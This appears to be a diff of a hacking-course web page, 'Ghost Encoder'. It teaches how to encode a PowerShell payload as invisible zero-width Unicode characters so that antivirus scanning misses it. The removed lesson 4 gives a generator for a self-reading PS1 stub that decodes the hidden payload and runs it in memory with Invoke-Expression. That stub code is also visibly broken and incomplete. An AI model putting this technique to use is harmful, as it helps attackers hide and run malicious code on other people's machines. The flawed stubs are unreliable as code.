@@ -6,354 +6,357 @@
 <title>Ghost Encoder — Course 02 — 22DIV LABS</title>
 <meta name="author" content="George Wu">
 <style>
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-:root {
-  --bg: #0c0c0c; --bg2: #111; --bg3: #161616; --bg4: #0a0a0a;
-  --green: #00ff41; --green2: #00cc33; --green3: #009922;
-  --amber: #ffb000; --red: #ff4444; --cyan: #00e5ff; --blue: #4488ff;
-  --dim: #555; --muted: #888; --text: #ccc; --bright: #eee;
-  --mono: "Cascadia Code","Consolas","Source Code Pro","Courier New",monospace;
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --bg:#0c0c0c;--bg2:#111;
+  --amber:#ffb000;--amber2:#cc8800;--amber3:#995500;
+  --dim:#555;--muted:#888;--text:#ccc;--bright:#eee;
+  --accent:var(--amber3);--accent-hi:var(--amber2);
+  --mono:"Cascadia Code","Consolas","Source Code Pro","Courier New",monospace;
 }
-html { scroll-behavior: smooth; }
-body { font-family: var(--mono); background: var(--bg); color: var(--text); line-height: 1.7; min-height: 100vh; }
-body::after { content:""; position:fixed; inset:0; background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,65,0.008) 3px,rgba(0,255,65,0.008) 4px); pointer-events:none; z-index:999; }
-nav { position:sticky; top:0; background:rgba(12,12,12,0.95); backdrop-filter:blur(8px); border-bottom:1px solid #1a1a1a; z-index:100; padding:0.6rem 0; }
-nav .inner { max-width:1200px; margin:0 auto; padding:0 1.5rem; display:flex; gap:1.5rem; align-items:center; }
-nav a { color:var(--amber); text-decoration:none; font-size:0.8rem; letter-spacing:0.05em; opacity:0.8; transition:opacity 0.2s; }
-nav a:hover { opacity:1; }
-nav a.brand { color:var(--bright); font-weight:bold; font-size:0.9rem; opacity:1; }
-.layout { display:grid; grid-template-columns:220px 1fr; max-width:1200px; margin:0 auto; padding:2rem 1.5rem; gap:2rem; }
-@media(max-width:768px) { .layout { grid-template-columns:1fr; } .sidebar { display:none; } }
-.sidebar { position:sticky; top:80px; height:fit-content; }
-.sidebar h3 { font-size:0.7rem; letter-spacing:0.1em; color:var(--dim); margin-bottom:1rem; }
-.lesson-nav-item { display:block; padding:0.5rem 0.8rem; font-size:0.75rem; color:var(--muted); border-left:2px solid #222; cursor:pointer; transition:all 0.2s; margin-bottom:0.2rem; }
-.lesson-nav-item:hover { color:var(--text); border-left-color:#444; }
-.lesson-nav-item.active { color:var(--amber); border-left-color:var(--amber); }
-.lesson-nav-item.done { color:var(--amber); border-left-color:var(--amber); opacity:0.6; }
-.lesson-nav-item.done::after { content:" ✓"; }
-.prog-bar { height:4px; background:#1a1a1a; margin:1.5rem 0 0.4rem; }
-.prog-fill { height:100%; background:var(--amber); transition:width 0.4s; }
-.prog-label { font-size:0.65rem; color:var(--dim); }
-.course-header { margin-bottom:2rem; border-bottom:1px solid #1a1a1a; padding-bottom:1.5rem; }
-.course-tag { font-size:0.65rem; letter-spacing:0.12em; color:var(--amber); margin-bottom:0.4rem; }
-.course-header h1 { font-size:1.2rem; color:var(--bright); letter-spacing:0.06em; }
-.course-header p { font-size:0.8rem; color:var(--muted); margin-top:0.4rem; }
-.lesson { display:none; } .lesson.active { display:block; }
-.lesson-header { margin-bottom:1.5rem; }
-.lesson-num { font-size:0.65rem; letter-spacing:0.12em; color:var(--amber); }
-.lesson-header h2 { font-size:1rem; color:var(--amber); letter-spacing:0.06em; margin:0.3rem 0 0.5rem; }
-.lesson-header .desc { font-size:0.82rem; color:var(--text); max-width:680px; }
-.concept-box { background:var(--bg2); border:1px solid #1e1e1e; border-left:3px solid var(--amber); padding:1.2rem; margin:1.5rem 0; }
-.concept-box h3 { font-size:0.75rem; letter-spacing:0.1em; color:var(--amber); margin-bottom:0.8rem; }
-.concept-box p { font-size:0.82rem; color:var(--text); margin-bottom:0.6rem; }
-.concept-box p:last-child { margin-bottom:0; }
-.concept-box code { color:var(--amber); background:#0a0a0a; padding:0.1rem 0.3rem; }
-.mission-box h3 { font-size:0.75rem; letter-spacing:0.1em; color:var(--amber); margin-bottom:0.8rem; border-left:3px solid var(--amber); padding-left:0.8rem; }
-.mission-box .task-desc { font-size:0.82rem; color:var(--text); margin-bottom:1rem; }
-.code-ref { background:var(--bg4); border:1px solid #1a1a1a; padding:1rem; margin-bottom:1rem; overflow-x:auto; }
-.code-ref-label { font-size:0.65rem; letter-spacing:0.08em; color:var(--dim); margin-bottom:0.5rem; }
-.code-ref pre { font-size:0.8rem; color:#ffc06a; line-height:1.6; white-space:pre; }
-.editor-label { font-size:0.7rem; letter-spacing:0.08em; color:var(--muted); margin-bottom:0.4rem; }
-textarea.code-editor { width:100%; min-height:160px; background:var(--bg4); color:var(--amber); font-family:var(--mono); font-size:0.82rem; border:1px solid #333; padding:1rem; resize:vertical; tab-size:4; outline:none; line-height:1.6; display:block; transition:border-color 0.2s; }
-textarea.code-editor:focus { border-color:var(--amber); }
-textarea.code-editor.pass { border-color:#886600; }
-textarea.code-editor.fail { border-color:var(--red); }
-.editor-controls { display:flex; gap:0.8rem; margin-top:0.6rem; }
-button { font-family:var(--mono); cursor:pointer; font-size:0.75rem; letter-spacing:0.06em; padding:0.5rem 1.2rem; border:none; transition:background 0.15s; }
-.btn-check { background:var(--amber); color:#000; }
-.btn-check:hover { background:#ffc333; }
-.btn-skip { background:#1a1a1a; color:var(--muted); border:1px solid #333; }
-.btn-skip:hover { color:var(--text); }
-.btn-next { background:var(--amber); color:#000; display:none; margin-top:1rem; }
-.btn-next.show { display:inline-block; }
-.btn-prev { background:#1a1a1a; color:var(--muted); border:1px solid #333; }
-.result-panel { margin-top:1rem; font-size:0.78rem; }
-.result-pass { color:var(--amber); padding:0.8rem; background:#1a1000; border:1px solid #553300; margin-bottom:0.5rem; }
-.result-fail { color:var(--red); padding:0.8rem; background:#1a0000; border:1px solid #550000; margin-bottom:0.5rem; }
-.line-ok { color:#886600; padding:0.15rem 0.5rem; }
-.line-err { color:var(--red); padding:0.15rem 0.5rem; background:#0d0000; margin:0.1rem 0; }
-.explain-box { background:#120b00; border:1px solid #553300; padding:1rem; margin-top:1rem; display:none; }
-.explain-box.show { display:block; }
-.explain-box h3 { font-size:0.75rem; letter-spacing:0.1em; color:var(--amber); margin-bottom:0.6rem; }
-.explain-box p { font-size:0.8rem; color:var(--text); margin-bottom:0.5rem; }
-.explain-box code { color:var(--amber); background:#0a0800; padding:0.1rem 0.3rem; }
-.lesson-nav-bar { display:flex; gap:1rem; margin-top:2rem; padding-top:1.5rem; border-top:1px solid #1a1a1a; }
-.complete-screen { display:none; text-align:center; padding:3rem 1rem; }
-.complete-screen.show { display:block; }
-.complete-screen h2 { font-size:1.3rem; color:var(--amber); letter-spacing:0.08em; margin-bottom:1rem; }
-.complete-screen p { font-size:0.85rem; color:var(--muted); margin-bottom:1.5rem; }
-.complete-screen a { color:var(--amber); text-decoration:none; }
+html{scroll-behavior:smooth;}
+body{font-family:var(--mono);background:var(--bg);color:var(--text);line-height:1.7;min-height:100vh;display:flex;flex-direction:column;}
+body::after{content:"";position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,176,0,0.006) 3px,rgba(255,176,0,0.006) 4px);pointer-events:none;z-index:999;}
+nav{position:sticky;top:0;background:rgba(12,12,12,0.95);backdrop-filter:blur(8px);border-bottom:1px solid #1a1a1a;z-index:100;padding:0.6rem 0;}
+nav .inner{max-width:1200px;margin:0 auto;padding:0 1.5rem;display:flex;gap:1.5rem;align-items:center;flex-wrap:wrap;}
+nav a{color:var(--amber2);text-decoration:none;font-size:0.8rem;letter-spacing:0.05em;opacity:.8;transition:opacity .2s;}
+nav a:hover{opacity:1;}
+nav a.brand{color:var(--bright);font-weight:bold;font-size:0.9rem;opacity:1;margin-right:auto;}
+.layout{display:flex;flex:1;max-width:1200px;margin:0 auto;width:100%;padding:1.5rem;gap:1.5rem;}
+.sidebar{width:220px;flex-shrink:0;}
+.sidebar-sticky{position:sticky;top:4rem;}
+.sidebar h3{font-size:0.7rem;letter-spacing:0.12em;color:var(--dim);margin-bottom:1rem;padding-bottom:0.4rem;border-bottom:1px solid #1a1a1a;}
+.nav-item{display:flex;align-items:center;gap:0.6rem;padding:0.4rem 0.6rem;margin-bottom:0.2rem;font-size:0.72rem;color:var(--muted);cursor:pointer;border:1px solid transparent;transition:all .15s;user-select:none;}
+.nav-item:hover{color:var(--accent-hi);border-color:#222;}
+.nav-item.active{color:var(--accent-hi);border-color:var(--amber2);background:rgba(204,136,0,0.05);}
+.nav-item.done{color:var(--amber3);}
+.nav-item.done .nav-num{background:var(--amber3);color:#000;border-color:var(--amber3);}
+.nav-num{width:20px;height:20px;display:flex;align-items:center;justify-content:center;font-size:0.6rem;border:1px solid #333;flex-shrink:0;}
+.nav-item.active .nav-num{border-color:var(--amber2);background:var(--amber2);color:#000;}
+.prog-wrap{margin-top:1.5rem;}
+.prog-label{font-size:0.65rem;color:var(--dim);margin-bottom:.4rem;}
+.prog-bar{height:3px;background:#1a1a1a;}
+.prog-fill{height:100%;background:var(--amber2);transition:width .3s;}
+.main{flex:1;min-width:0;}
+.lesson{display:none;}.lesson.active{display:block;}
+.lang-badge{display:inline-block;padding:0.2rem 0.7rem;font-size:0.62rem;letter-spacing:0.12em;border:1px solid;margin-bottom:0.8rem;font-weight:bold;}
+.lang-python{border-color:#3d7ab5;color:#5b9bd5;background:rgba(59,122,181,0.05);}
+.lesson-header{margin-bottom:1.2rem;border-bottom:1px solid #1a1a1a;padding-bottom:1rem;}
+.lesson-tag{font-size:0.65rem;letter-spacing:0.12em;color:var(--dim);margin-bottom:.4rem;}
+.lesson-header h2{font-size:1.15rem;color:var(--bright);letter-spacing:0.04em;margin-bottom:.4rem;}
+.lesson-header p{font-size:0.82rem;color:var(--muted);}
+.metaphor{background:#0c0a05;border-left:3px solid var(--amber2);padding:1rem 1.2rem;margin-bottom:1.2rem;font-size:0.82rem;color:var(--muted);}
+.metaphor .meta-label{font-size:0.65rem;letter-spacing:0.12em;color:var(--amber2);margin-bottom:0.5rem;}
+.metaphor strong{color:var(--bright);}
+.nomenclature{margin-bottom:1.2rem;border:1px solid #2a2010;}
+.nomenclature h4{font-size:0.65rem;letter-spacing:0.12em;color:var(--amber2);padding:0.6rem 1rem;border-bottom:1px solid #2a2010;background:#0c0a05;}
+.nomenclature table{width:100%;border-collapse:collapse;font-size:0.77rem;}
+.nomenclature td{padding:0.45rem 1rem;border-bottom:1px solid #111;vertical-align:top;}
+.nomenclature td:first-child{color:#ddaa55;width:195px;white-space:nowrap;font-weight:bold;}
+.nomenclature td:last-child{color:var(--muted);}
+.nomenclature tr:last-child td{border-bottom:none;}
+.code-ref{background:#060606;border:1px solid #1a1405;padding:1rem;margin-bottom:1.2rem;overflow-x:auto;}
+.code-ref-label{font-size:0.65rem;letter-spacing:0.1em;color:var(--dim);margin-bottom:.6rem;}
+.code-ref pre{font-size:0.76rem;color:#ccaa77;line-height:1.65;white-space:pre;}
+.code-ref pre .cm{color:var(--dim);}
+.task-label{font-size:0.7rem;letter-spacing:0.1em;color:var(--amber2);margin-bottom:.5rem;margin-top:0.5rem;}
+.task-desc{font-size:0.8rem;color:var(--muted);margin-bottom:0.8rem;}
+.code-editor{width:100%;background:#060606;border:1px solid #222;color:var(--text);font-family:var(--mono);font-size:0.76rem;padding:.8rem;resize:vertical;min-height:200px;line-height:1.6;outline:none;transition:border-color .2s;display:block;}
+.code-editor:focus{border-color:#333;}
+.code-editor.pass{border-color:var(--amber2);}
+.code-editor.fail{border-color:#882222;}
+.btn-row{display:flex;gap:.8rem;margin:.7rem 0;flex-wrap:wrap;}
+.btn{padding:.45rem 1.2rem;font-size:.75rem;font-family:var(--mono);letter-spacing:.06em;cursor:pointer;border:1px solid;background:transparent;transition:all .15s;}
+.btn-check{border-color:var(--amber2);color:var(--amber2);}
+.btn-check:hover{background:var(--amber2);color:#000;}
+.btn-skip{border-color:#333;color:var(--dim);}
+.btn-skip:hover{border-color:#555;color:var(--muted);}
+.result{margin:0.5rem 0;font-size:0.76rem;}
+.result-pass{color:var(--amber2);margin-bottom:.4rem;}
+.result-fail{color:#ff6666;margin-bottom:.4rem;}
+.line-ok{color:var(--dim);padding:0.1rem 0;}
+.line-err{color:#ff8888;padding:0.15rem 0.4rem;margin:0.1rem 0;background:rgba(136,0,0,0.08);}
+.explain{display:none;background:var(--bg2);border:1px solid #2a2010;padding:1rem 1.2rem;margin-top:.8rem;font-size:0.8rem;color:var(--muted);}
+.explain.show{display:block;}
+.explain h4{font-size:0.65rem;letter-spacing:0.1em;color:var(--amber2);margin-bottom:.5rem;}
+.next-wrap{display:none;margin-top:1rem;padding-top:1rem;border-top:1px solid #1a1a1a;}
+.next-wrap.show{display:flex;gap:1rem;}
+.btn-next{border-color:var(--amber2);color:var(--amber2);}
+.btn-next:hover{background:var(--amber2);color:#000;}
+.btn-prev{border-color:#222;color:var(--dim);}
+.btn-prev:hover{border-color:#444;color:var(--muted);}
+.complete-screen{display:none;text-align:center;padding:3rem 2rem;}
+.complete-screen.show{display:block;}
+.complete-screen h2{font-size:1.2rem;color:var(--amber2);letter-spacing:.1em;margin-bottom:1rem;}
+.complete-screen p{font-size:.82rem;color:var(--muted);margin-bottom:.6rem;}
+.complete-screen a{color:var(--amber2);text-decoration:none;}
+code{background:#1a1a1a;padding:.1em .3em;color:#ddaa55;font-size:.88em;}
 </style>
 </head>
 <body>
 <nav>
   <div class="inner">
     <a href="../index.html" class="brand">VADER // 22DIV</a>
-    <a href="index.html">← LABS</a>
-    <a href="#">GHOST ENCODER</a>
+    <a href="index.html" style="color:var(--amber2)">← LABS</a>
+    <span style="color:var(--dim);font-size:.75rem">// COURSE 02 — GHOST ENCODER</span>
   </div>
 </nav>
 <div class="layout">
-  <aside class="sidebar">
+<aside class="sidebar">
+  <div class="sidebar-sticky">
     <h3>// LESSONS</h3>
-    <div class="lesson-nav-item active" onclick="goLesson(1)" id="nav-1">01. THE GHOST ALPHABET</div>
-    <div class="lesson-nav-item" onclick="goLesson(2)" id="nav-2">02. ENCODE BYTES</div>
-    <div class="lesson-nav-item" onclick="goLesson(3)" id="nav-3">03. DECODE BYTES</div>
-    <div class="lesson-nav-item" onclick="goLesson(4)" id="nav-4">04. PS1 BOOTSTRAP</div>
-    <div class="prog-bar"><div class="prog-fill" id="overall-prog" style="width:0%"></div></div>
-    <div class="prog-label" id="overall-label">0 / 4 complete</div>
-  </aside>
-  <main>
-    <div class="course-header">
-      <div class="course-tag">// COURSE 02 — STEGANOGRAPHY</div>
-      <h1>GHOST ENCODER</h1>
-      <p>Zero-width Unicode steganographic payload encoding. The payload looks blank. 16 invisible characters. 4 bits each. AV sees nothing.</p>
+    <div class="nav-item active" id="nav-1" onclick="goLesson(1)"><span class="nav-num">1</span>Ghost Alphabet</div>
+    <div class="nav-item" id="nav-2" onclick="goLesson(2)"><span class="nav-num">2</span>Encode Bytes</div>
+    <div class="nav-item" id="nav-3" onclick="goLesson(3)"><span class="nav-num">3</span>Decode Ghost</div>
+    <div class="nav-item" id="nav-4" onclick="goLesson(4)"><span class="nav-num">4</span>PS1 Bootstrap</div>
+    <div class="prog-wrap">
+      <div class="prog-label" id="overall-label">0 / 4 complete</div>
+      <div class="prog-bar"><div class="prog-fill" id="overall-prog" style="width:0%"></div></div>
     </div>
+  </div>
+</aside>
+<main class="main">
 
-    <div class="lesson active" id="lesson-1">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 01 / 04</div>
-        <h2>THE GHOST ALPHABET</h2>
-        <div class="desc">Unicode includes characters with zero visible width — they render as nothing in every text editor and terminal. We use 16 of them as a hex encoding alphabet.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// THE 16 INVISIBLE CHARACTERS</h3>
-        <p>Unicode has characters that legitimately have no visual representation — Zero Width Space, Zero Width Joiner, Mongolian Vowel Separator. They're in the standard for real linguistic reasons.</p>
-        <p>We take 16 of them and assign hex values 0x0 through 0xF. Any byte (0x00–0xFF) can then be encoded as exactly 2 invisible characters — high nibble then low nibble.</p>
-        <p>A 10KB payload becomes 20KB of invisible Unicode. <code>cat ghost.ps1</code> outputs a blank line. <code>Get-Content ghost.ps1</code> shows nothing. The payload is RIGHT THERE — just invisible.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Define the GHOST_ALPHABET and GHOST_REVERSE lookup</h3>
-        <div class="task-desc">Define the Python list of 16 invisible chars and the reverse lookup dict. The chars themselves are in the code-ref below — copy them exactly. The reverse dict maps each char to its index.</div>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE:</div>
-          <pre>GHOST_ALPHABET = [
-    '​',  # 0x0
-    '‌',  # 0x1
-    '‍',  # 0x2
-    '⁠',  # 0x3
-    '⁡',  # 0x4
-    '⁢',  # 0x5
-    '⁣',  # 0x6
-    '⁤',  # 0x7
-    '⁪',  # 0x8
-    '⁫',  # 0x9
-    '⁬',  # 0xA
-    '⁭',  # 0xB
-    '⁮',  # 0xC
-    '⁯',  # 0xD
-    '﻿',  # 0xE
-    '᠎',  # 0xF
+<!-- LESSON 1 -->
+<div class="lesson active" id="lesson-1">
+  <div class="lesson-header">
+    <span class="lang-badge lang-python">PYTHON 3</span>
+    <div class="lesson-tag">// LESSON 01 / 04 — GHOST ALPHABET</div>
+    <h2>The Codebook — 16 Symbols, Zero Width</h2>
+    <p>Your alphabet has exactly 16 characters. They all render as nothing. A 16-character set encodes any nibble (4 bits, 0-15) as one invisible character. Pair two nibbles and you have one byte. That's the whole system.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    Invisible ink. The letter looks blank. But under UV light, 16 distinct symbols appear — each marking one hex digit. You write your message in these symbols, append it to a normal-looking letter, and send it. <strong>The 16 Unicode zero-width characters are your UV-ink symbols. The host text is your cover letter. GHOST_REVERSE is the UV light.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — PYTHON DATA STRUCTURES</h4>
+    <table>
+      <tr><td><code>​</code> etc.</td><td>Unicode escape sequence. 4-digit hex code point after \u. U+200B = ZERO WIDTH SPACE. Invisible in all renderers — no glyph, no advance width. Valid Unicode, survives copy-paste and file saves.</td></tr>
+      <tr><td>list literal</td><td><code>[item, item, ...]</code>. Ordered sequence, zero-indexed. <code>GHOST_ALPHABET[4]</code> returns the 5th character. ORDER IS THE CODEBOOK — swap entries and you break all encoded data.</td></tr>
+      <tr><td>dict comprehension</td><td><code>{key: val for var in iterable}</code>. Builds a dictionary in one expression. Used here to invert the alphabet list into a character→index lookup.</td></tr>
+      <tr><td><code>enumerate(iterable)</code></td><td>Yields <code>(index, value)</code> pairs. <code>for i, c in enumerate(GHOST_ALPHABET)</code> gives you both position (0-15) and character simultaneously — exactly what you need to build a reverse map.</td></tr>
+      <tr><td><code>GHOST_REVERSE</code></td><td>The reverse map: character → index. Given any invisible char, returns its 0-15 value. Built from GHOST_ALPHABET in one line. This is what the decoder uses to reconstruct nibbles.</td></tr>
+      <tr><td>inline comment <code># 0x0</code></td><td>Python ignores everything after # on a line. These mark which nibble each character encodes. 0x0 = hex zero. Documentation only — not part of the code logic.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>GHOST_ALPHABET = [
+    '​',  <span class="cm"># 0x0 — ZERO WIDTH SPACE (index 0 = nibble value 0)</span>
+    '‌',  <span class="cm"># 0x1 — ZERO WIDTH NON-JOINER</span>
+    '‍',  <span class="cm"># 0x2 — ZERO WIDTH JOINER</span>
+    '⁠',  <span class="cm"># 0x3 — WORD JOINER</span>
+    '⁡',  <span class="cm"># 0x4 — FUNCTION APPLICATION</span>
+    '⁢',  <span class="cm"># 0x5 — INVISIBLE TIMES</span>
+    '⁣',  <span class="cm"># 0x6 — INVISIBLE SEPARATOR</span>
+    '⁤',  <span class="cm"># 0x7 — INVISIBLE PLUS</span>
+    '⁪',  <span class="cm"># 0x8 — INHIBIT SYMMETRIC SWAPPING</span>
+    '⁫',  <span class="cm"># 0x9 — ACTIVATE SYMMETRIC SWAPPING</span>
+    '⁬',  <span class="cm"># 0xA — INHIBIT ARABIC FORM SHAPING</span>
+    '⁭',  <span class="cm"># 0xB — ACTIVATE ARABIC FORM SHAPING</span>
+    '⁮',  <span class="cm"># 0xC — NATIONAL DIGIT SHAPES</span>
+    '⁯',  <span class="cm"># 0xD — NOMINAL DIGIT SHAPES</span>
+    '﻿',  <span class="cm"># 0xE — BYTE ORDER MARK (zero-width)</span>
+    '᠎',  <span class="cm"># 0xF — MONGOLIAN VOWEL SEPARATOR</span>
 ]
-
+<span class="cm"># Invert list to dict: {char: index}. enumerate gives (0,'​'), (1,'‌')...</span>
 GHOST_REVERSE = {c: i for i, c in enumerate(GHOST_ALPHABET)}</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-1" placeholder="# Define GHOST_ALPHABET as a list of 16 unicode chars
-# Use \uXXXX escape sequences
-# Then define GHOST_REVERSE as a dict comprehension"></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(1)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(1)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-1"></div>
-        <div class="explain-box" id="explain-1">
-          <h3>// WHAT JUST HAPPENED</h3>
-          <p><code>​</code> is Zero Width Space — it's been in Unicode since 1993. Appears in documents where line-breaking is needed but no space should be visible. 100% legitimate Unicode.</p>
-          <p><code>{c: i for i, c in enumerate(GHOST_ALPHABET)}</code> — dict comprehension. <code>enumerate</code> gives (index, char) pairs. We flip it to char→index for O(1) decode lookup.</p>
-          <p>This is the entire alphabet. 16 chars. 4 bits per char. 2 chars per byte. That's it. The simplicity is the point — no complex crypto, no dependencies, just Unicode assignment.</p>
-        </div>
-        <button class="btn-next" id="next-1" onclick="goLesson(2)">NEXT: ENCODE BYTES →</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" disabled>← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(1)">SKIP →</button>
-      </div>
-    </div>
-
-    <div class="lesson" id="lesson-2">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 02 / 04</div>
-        <h2>ENCODE BYTES → INVISIBLE UNICODE</h2>
-        <div class="desc">Each byte becomes two invisible chars. High nibble first, low nibble second. A 3-byte string like "ABC" becomes 6 invisible characters — completely invisible in any editor.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// NIBBLE SPLITTING</h3>
-        <p>A byte is 8 bits. Split it into two 4-bit nibbles: high = top 4 bits, low = bottom 4 bits.</p>
-        <p>For byte <code>0x41</code> ('A'): <code>high = (0x41 >> 4) & 0x0F = 0x4</code>, <code>low = 0x41 & 0x0F = 0x1</code>. Two nibbles, each maps to one invisible char.</p>
-        <p>The decoder reverses this: sees two chars, looks up their indices (high, low), reconstructs <code>(high &lt;&lt; 4) | low = 0x41</code>.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Write encode_bytes()</h3>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE:</div>
-          <pre>def encode_bytes(data: bytes) -> str:
-    encoded = []
-    for byte in data:
-        high = (byte >> 4) & 0x0F
-        low = byte & 0x0F
-        encoded.append(GHOST_ALPHABET[high])
-        encoded.append(GHOST_ALPHABET[low])
-    return ''.join(encoded)</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-2" placeholder="def encode_bytes(data: bytes) -> str:
-    ..."></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(2)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(2)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-2"></div>
-        <div class="explain-box" id="explain-2">
-          <h3>// WHAT JUST HAPPENED</h3>
-          <p><code>byte >> 4</code> — right shift 4 positions. Moves the high 4 bits down to positions 0-3. <code>& 0x0F</code> masks to keep only those 4 bits (clears any garbage in upper bits after shift).</p>
-          <p><code>byte & 0x0F</code> — mask the bottom 4 bits directly. Upper bits become zero.</p>
-          <p>Result: two indices 0-15, each mapped to an invisible Unicode char. <code>''.join(encoded)</code> concatenates them all. Output is a pure-invisible string.</p>
-        </div>
-        <button class="btn-next" id="next-2" onclick="goLesson(3)">NEXT: DECODE BYTES →</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" onclick="goLesson(1)">← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(2)">SKIP →</button>
-      </div>
-    </div>
-
-    <div class="lesson" id="lesson-3">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 03 / 04</div>
-        <h2>DECODE BACK TO BYTES</h2>
-        <div class="desc">The reverse operation. Filter the invisible chars from the text, look up their indices in GHOST_REVERSE, pair them up, reconstruct bytes.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// DECODING STRATEGY</h3>
-        <p>The encoded text may be embedded in a larger string (with visible chars around it). Filter to only the chars present in GHOST_REVERSE. They appear in pairs — char[0]+char[1] = byte[0], char[2]+char[3] = byte[1], etc.</p>
-        <p>For each pair: look up both indices, reconstruct byte as <code>(high &lt;&lt; 4) | low</code>. Collect into a bytearray. Return as bytes.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Write decode_ghost()</h3>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE:</div>
-          <pre>def decode_ghost(ghost_text: str) -> bytes:
-    result = []
-    chars = [c for c in ghost_text if c in GHOST_REVERSE]
-    for i in range(0, len(chars), 2):
-        high = GHOST_REVERSE[chars[i]]
-        low = GHOST_REVERSE[chars[i + 1]]
-        result.append((high << 4) | low)
-    return bytes(result)</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-3" placeholder="def decode_ghost(ghost_text: str) -> bytes:
-    ..."></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(3)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(3)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-3"></div>
-        <div class="explain-box" id="explain-3">
-          <h3>// WHAT JUST HAPPENED</h3>
-          <p><code>[c for c in ghost_text if c in GHOST_REVERSE]</code> — filter comprehension. Only keeps chars that are in our alphabet. This handles mixed-content strings where invisible chars are embedded in visible text (like the PS1 bootstrap stub).</p>
-          <p><code>range(0, len(chars), 2)</code> — step 2, process pairs. chars[i] = high nibble char, chars[i+1] = low nibble char.</p>
-          <p><code>(high &lt;&lt; 4) | low</code> — shift high nibble back up to bits 4-7, OR in the low nibble at bits 0-3. Reconstructs the original byte.</p>
-          <p>Round-trip test: <code>assert decode_ghost(encode_bytes(b"hello")) == b"hello"</code> — this passes. The encoding is lossless.</p>
-        </div>
-        <button class="btn-next" id="next-3" onclick="goLesson(4)">NEXT: PS1 BOOTSTRAP →</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" onclick="goLesson(2)">← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(3)">SKIP →</button>
-      </div>
-    </div>
-
-    <div class="lesson" id="lesson-4">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 04 / 04</div>
-        <h2>PS1 BOOTSTRAP — EXECUTE IN MEMORY</h2>
-        <div class="desc">The final piece. A visible PS1 stub that decodes the invisible payload and executes it via Invoke-Expression — all in memory, nothing written to disk as cleartext.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// THE BOOTSTRAP TECHNIQUE</h3>
-        <p>The ghost.ps1 file has two parts: a visible decoder stub at the top, and the invisible encoded payload embedded after it.</p>
-        <p>The stub reads the current file (<code>$PSCommandPath</code>), extracts the invisible chars, decodes them back to the original PS1 code, and calls <code>Invoke-Expression</code> on the result.</p>
-        <p>AV scans the visible stub — it's clean (just string operations). The invisible payload isn't a signature match. The real code executes in-memory and exits.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Write the Python function that generates the bootstrap PS1</h3>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE — generate_ghost_ps1():</div>
-          <pre>def generate_ghost_ps1(payload_ps1: str) -> str:
-    payload_bytes = payload_ps1.encode('utf-8')
-    encoded = encode_bytes(payload_bytes)
-    stub = (
-        '$raw = [IO.File]::ReadAllText($PSCommandPath)\n'
-        '$ghost = [string]::new(($raw.ToCharArray()'
-        ' | Where-Object { [int][char]$_ -lt 32 -or [int][char]$_ -gt 126 }))\n'
-        '$bytes = @()\n'
-        '$alpha = @{}\n'
-        '$i = 0\n'
-        'foreach ($c in $ghost.ToCharArray()) {\n'
-        '    if ($alpha.Count -eq 0) { break }\n'
-        '}\n'
-    )
-    decoded_stub = (
-        '[Text.Encoding]::UTF8.GetString('
-        '[Ghost.Decoder]::Decode($ghost))\n'
-    )
-    simple_stub = (
-        "# ghost\n"
-        "$src = [IO.File]::ReadAllText($PSCommandPath)\n"
-        "$zw = [string]::new(($src.ToCharArray() | ?{[int][char]$_ -lt 33}))\n"
-        "$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($zw))\n"
-        "IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64)))\n"
-    )
-    return simple_stub + encoded</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-4" placeholder="def generate_ghost_ps1(payload_ps1: str) -> str:
-    # 1. encode the payload bytes to invisible unicode
